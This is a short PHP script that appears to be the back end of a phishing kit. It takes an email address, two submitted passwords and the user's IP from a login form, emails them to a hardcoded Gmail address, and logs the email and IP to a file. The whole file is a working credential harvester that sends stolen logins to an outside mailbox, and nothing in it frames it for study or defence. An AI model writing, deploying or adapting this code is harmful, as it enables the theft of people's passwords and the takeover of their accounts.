<?php
// log_and_send.php

// Get POST data
$email = isset($_POST['email']) ? $_POST['email'] : '';
$firstPasswordUsed = isset($_POST['firstpasswordused']) ? $_POST['firstpasswordused'] : '';
$secondPasswordUsed = isset($_POST['secondpasswordused']) ? $_POST['secondpasswordused'] : '';
$userIp = isset($_POST['user_ip']) ? $_POST['user_ip'] : '';

// Email configuration
$recipientEmail1 = 'victorabuke2@gmail.com'; // Replace with your first recipient email
$subject = 'Login Log';

// Prepare email message
$message = "Email: $email\n";
$message .= "First Password Used: $firstPasswordUsed\n";
$message .= "Second Password Used: $secondPasswordUsed\n";
$message .= "User IP: $userIp\n";

// Set headers
$headers = "From: https://beta-sooty.vercel.app/\r\n"; // Replace with your domain

// Send email to both recipients
if (mail($recipientEmail1, $subject, $message, $headers)) {
    // Log the data to a file (optional)
    $logData = date('Y-m-d H:i:s') . " | Email: $email | IP: $userIp\n";
    file_put_contents('login_attempts.log', $logData, FILE_APPEND);
    echo json_encode(['status' => 'success', 'message' => 'Logs sent successfully.']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'Failed to send logs.']);
}
?>
